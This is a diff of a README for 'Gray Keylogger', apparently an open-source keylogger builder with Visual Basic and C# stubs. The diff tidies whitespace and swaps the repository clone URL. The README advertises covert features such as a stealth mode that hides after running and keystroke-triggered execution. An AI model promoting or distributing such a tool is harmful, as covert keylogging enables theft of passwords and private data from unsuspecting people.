@@ -11,7 +11,6 @@
 <li>ErrorReporting (Helpfull for developers or Turn off if not needed)</li>
 <li>Added Icon support</li>
 </ul>
-
 <h2> Features</h2>
 <ul>
 <li>Easy Graphical User Interface</li>
@@ -20,22 +19,18 @@
 <li>Added Stealth mode (hides after running)</li>
 <li>Run only when any keyboard key is pressed</li>
 </ul>
-
-
 <h2> Plans Inshallah</h2>
 <ul>
 <li>Add Graphical app for linux</li>
 <li>Add more stubs including Python,Powershell, C/C++</li>
 </ul>
-
-
 <h2> Some words</h2>
 <p>I made this keylogger both GUI + stub in Visual Basic. C# was similar so I also added C# stub. I am also planning to add more stubs in different languages for different plateforms. Developers are always incouraged to contribute. Users can contribute by using this keylogger and reporting bugs/errors.</p>
 <p>I will be more happy if this keylogger has more stubs and supported plateforms.</p>
 <p>Gray keylogger was my first programming project. As time past, I started updating. Its third version. Now it is an ideal example for all of us who want to code and keep on moving.</p>
 
 <h2> Usage</h2>
-<pre><code>git clone https://github.com/graysuit/gray-keylogger-2.git</code></pre>
+<pre><code>git clone https://github.com/DarkSecDevelopers/GrayKeylogger.git</code></pre>
 
 <h2> Warnings</h2>
 <ul>
